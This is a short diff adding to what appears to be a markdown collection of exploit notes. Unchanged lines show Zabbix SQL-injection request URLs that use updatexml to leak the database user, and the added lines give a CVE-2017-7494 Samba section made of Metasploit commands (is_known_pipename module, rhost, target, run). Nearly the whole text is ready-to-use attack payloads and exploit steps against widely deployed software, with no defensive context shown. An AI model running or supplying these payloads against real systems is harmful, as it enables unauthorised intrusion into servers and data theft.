@@ -1615,3 +1615,11 @@ http://your-ip:8080/latest.php?output=ajax&sid=055e1ffa36164a58&favobj=toggle&to
 http://your-ip:8080/jsrpc.php?type=0&mode=1&method=screen.get&profileIdx=web.item.graph&resourcetype=17&profileIdx2=updatexml(0,concat(0xa,user()),0)：
 ```
 
+**CVE-2017-7494**
+
+```bash
+     use exploit/linux/samba/is_known_pipename
+    set rhost <ip>
+    set target 3
+    run
+```
